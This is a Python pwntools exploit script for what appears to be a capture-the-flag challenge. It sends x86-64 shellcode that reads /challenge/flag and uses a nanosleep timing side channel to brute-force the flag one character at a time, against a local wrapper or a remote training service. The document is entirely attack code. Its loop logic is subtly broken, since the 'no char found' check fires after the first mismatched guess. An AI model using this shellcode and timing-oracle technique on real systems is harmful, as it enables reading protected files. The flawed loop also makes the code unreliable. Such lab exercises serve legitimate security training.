import os
import subprocess
import string
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def get_timing(p):
    """Extract timing from process using recvuntil/recvline"""
    try:
        # Wait for "Time: " and get the number
        p.recvuntil(b"Time: ")
        timing_str = p.recvline().decode().strip()
        return float(timing_str)
    except Exception as e:
        log.warning(f"Failed to get timing: {e}")
        return 0.0

def create_timing_shellcode(position, character):
    shellcode = asm(f'''
        /* Open /challenge/flag */
        mov rax, 0x00000067616c662f
        push rax
        mov rax, 0x656c6c656e616863
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        /* Read flag into stack */
        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        /* Check character at position {position} */
        cmp byte ptr [rsi + {position}], {character}
        jne skip
        
        /* If match, nanosleep for 0.1 seconds */
        push 0
        push 100000000
        mov rsi, rsp
        xor rdi, rdi
        mov rax, 35
        syscall
        add rsp, 16
        
    skip:
        xor rdi, rdi
        mov rax, 60
        syscall
    ''')
    
    return shellcode.ljust(1024, b'\x90')

def brute_force_flag():
    flag = ""
    position = 0
    charset = string.printable
    env = {'PYTHONUNBUFFERED': '1'}
    failure = False
    over = False

    while not over:
        log.info(f"Position {position}, current: {flag}")
        found_char = False

        for character in charset:
            try:
                if args.REMOTE:
                    p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
                else:
                    p = process(['python3', 'wrapper.py'], env=env)

                # Wait for prompt
                p.recvuntil(b"Shellcode: ")

                shellcode = create_timing_shellcode(position, ord(character))
                
                p.send(shellcode)
                time_val = get_timing(p)
                p.close()
                #output = p.recvall()

                #time_str = output.split("Time: ")[1].strip()
                #time_val = float(time_str)
                log.info(f"Char '{character}': {time_val:.3f}s")

                if time_val > 0.05:
                    flag += character
                    log.success(f"Found: '{character}' -> {flag}")
                    found_char = True
                    position += 1
                    break

            except Exception as e:
                log.warning(f"Error with '{character}': {e}")
                try:
                    p.close()
                except:
                    pass
                continue
            finally:
                try:
                    p.close()
                except:
                    pass

            if not found_char:
                log.warning(f"No char found for position {position}")
                failure = True
                over = True
                break
                
            if flag.endswith('}'):
                log.success(f"Complete: {flag}")
                failure = False
                over = True
                break
    if failure:
        log.info("failure")
    else:
        log.info("success!")
    return flag

brute_force_flag()